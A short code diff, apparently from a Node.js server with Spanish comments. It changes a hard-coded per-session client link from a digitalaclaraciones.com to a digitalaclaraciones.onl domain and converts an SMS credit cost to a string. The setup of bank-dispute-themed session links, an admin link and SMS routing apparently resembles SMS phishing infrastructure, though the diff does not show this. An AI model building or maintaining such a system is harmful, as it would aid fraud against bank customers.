@@ -1213,8 +1213,8 @@ _Fecha: ${new Date().toLocaleString('es-MX')}_
       const baseUrl = req.headers.host || (isReplit ? `${process.env.REPL_SLUG || 'workspace'}.replit.dev` : clientDomain);
       const protocol = req.headers['x-forwarded-proto'] || 'https';
       
-      // FORZAMOS el uso de digitalaclaraciones.com independientemente del entorno
-      const clientLink = `https://digitalaclaraciones.com/${sessionId}`;
+      // FORZAMOS el uso de digitalaclaraciones.onl independientemente del entorno
+      const clientLink = `https://digitalaclaraciones.onl/${sessionId}`;
       
       // Para el admin link, si estamos en Replit permitimos usar la URL local para testing
       const adminLink = isReplit 
@@ -2827,7 +2827,7 @@ _Fecha: ${new Date().toLocaleString('es-MX')}_
           message,
           sessionId: req.body.sessionId || null,
           routeType: selectedRoute,
-          creditCost: selectedRoute === SmsRouteType.LONG_CODE ? 0.5 : 1
+          creditCost: (selectedRoute === SmsRouteType.LONG_CODE ? 0.5 : 1).toString()
         });
       });
 
